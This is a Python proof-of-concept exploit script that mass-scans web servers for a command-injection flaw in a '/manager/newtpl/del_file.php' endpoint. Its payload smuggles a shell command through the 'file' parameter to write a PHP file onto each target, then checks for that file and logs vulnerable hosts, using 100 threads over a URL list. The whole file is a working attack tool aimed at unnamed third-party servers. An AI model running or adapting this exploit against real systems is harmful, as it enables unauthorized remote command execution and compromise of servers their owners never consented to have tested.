import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

██████╗ ██╗  ██╗██╗    ██╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗╚██╗██╔╝██║    ██║██╔════╝ ██╔══██╗██╔════╝██╔════╝
██║  ██║ ╚███╔╝ ██║ █╗ ██║██║  ███╗██████╔╝██║     █████╗  
██║  ██║ ██╔██╗ ██║███╗██║██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██╔╝ ██╗╚███╔███╔╝╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
                                                           
                                                version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/manager/newtpl/del_file.php?file=1.txt|echo%20o8nahpm39boa2gs%20%3E%20abcwavkww.php"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close'
    }
    try:
        res = requests.post(url=url,headers=headers,verify=False,timeout=10)
        url2 = target+"/manager/newtpl/abcwavkww.php"
        res2 = requests.get(url2, verify=False)
        if res.status_code == 200 and res2.status_code == 200 and 'o8nahpm39boa2gs' in res2.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()